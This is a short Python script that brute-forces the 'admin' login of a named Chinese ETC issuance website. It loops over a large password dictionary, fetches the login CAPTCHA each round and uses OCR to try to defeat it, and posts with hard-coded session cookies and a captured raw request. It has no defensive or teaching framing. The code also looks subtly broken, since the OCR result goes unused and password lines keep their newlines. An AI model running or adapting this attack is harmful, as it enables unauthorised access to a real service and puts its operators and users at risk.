import ddddocr
import requests

url1 = 'https://jgcxmp.jitonginfo.cn/ETCIssue/user_info_imageServlet.do?0.9977324621016661'  # get验证码
pack1 = """
POST /ETCIssue/login.do HTTP/2
Host: jgcxmp.jitonginfo.cn
Cookie: JSESSIONID=B5B1F834169F62B0E43D68DD23942712; SERVERID=3532507c4040b78f3a093293129d5867|1660695579|1660695468
Content-Length: 44
Cache-Control: max-age=0
Sec-Ch-Ua: "Chromium";v="104", " Not A;Brand";v="99", "Google Chrome";v="104"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Upgrade-Insecure-Requests: 1
Origin: https://jgcxmp.jitonginfo.cn
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://jgcxmp.jitonginfo.cn/ETCIssue/login.do
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9

accountNum=username_replace&password=pasasword_replace&imageCode=code_replace
"""
headers = {
    'Sec-Ch-Ua': '"Chromium";v="104", " Not A;Brand";v="99", "Google Chrome";v="104"',
    'Sec-Ch-Ua-Mobile': '?0',
    'Upgrade-Insecure-Requests': '1',
    'Origin': 'https://jgcxmp.jitonginfo.cn',
    'Content-Type': 'application/x-www-form-urlencoded',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
    'Sec-Fetch-Site': 'same-origin',
    'Sec-Fetch-Mode': 'navigate',
    'Sec-Fetch-User': '?1',
    'Sec-Fetch-Dest': 'document',
    'Referer': 'https://jgcxmp.jitonginfo.cn/ETCIssue/login.do',
    'Accept-Encoding': 'gzip, deflate',
    'Accept-Language': 'zh-CN,zh;q=0.9'
}
cookies = {
    'JSESSIONID': 'B5B1F834169F62B0E43D68DD23942712',
    'SERVERID': '3532507c4040b78f3a093293129d5867|1660695579|1660695468'
}
username = 'admin'
password_file = 'exp/dic/LargePwds.txt'
f = open(password_file, 'r')
for it in f:
    pwd = str(it)
    img = requests.get(url1, headers=headers, cookies=cookies).content
    ocr = ddddocr.DdddOcr()
    ocr_res = ocr.classification(img)  # 识别
    code = 1
    data = {
        'accountNum': username,
        'password': pwd,
        'imageCode': code
    }
    r = requests.post('https://jgcxmp.jitonginfo.cn/ETCIssue/login.do', headers=headers, cookies=cookies,
                      data=data).text
    print(r)
